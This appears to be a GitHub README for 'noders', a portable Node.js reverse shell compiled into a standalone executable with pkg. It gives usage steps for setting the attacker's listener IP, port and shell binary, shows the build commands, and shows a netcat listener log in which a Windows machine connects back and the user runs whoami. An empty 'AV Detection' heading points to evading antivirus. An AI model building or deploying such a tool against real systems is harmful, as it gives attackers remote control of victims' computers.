# noders

portable node.js reverse shell using https://github.com/zeit/pkg 

**Usage**

- Update noders.js source listener ip,port, binary (cmd.exe, /bin/sh, etc).
- Compile using pkg to target platform https://github.com/zeit/pkg#targets

Setup
```
node@kali:/opt/noders# npm install -g pkg
root@kali:/opt/noders# pkg -t win noders.js
> pkg@4.4.0
> Fetching base Node.js binaries to PKG_CACHE_PATH
  fetched-v10.15.3-win-x64     [====================] 100%
  fetched-v10.15.3-linux-x64   [====================] 100%
root@kali:/opt/noders# ls
noders.exe  noders.js
```
Listener
```
root@kali:~# nc -lvp 8080
listening on [any] 8080 ...
192.168.116.173: inverse host lookup failed: Unknown host
connect to [192.168.116.200] from (UNKNOWN) [192.168.116.173] 50053
Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\IEUser\Desktop>whoami
whoami
msedgewin10\ieuser

```

**AV Detection**

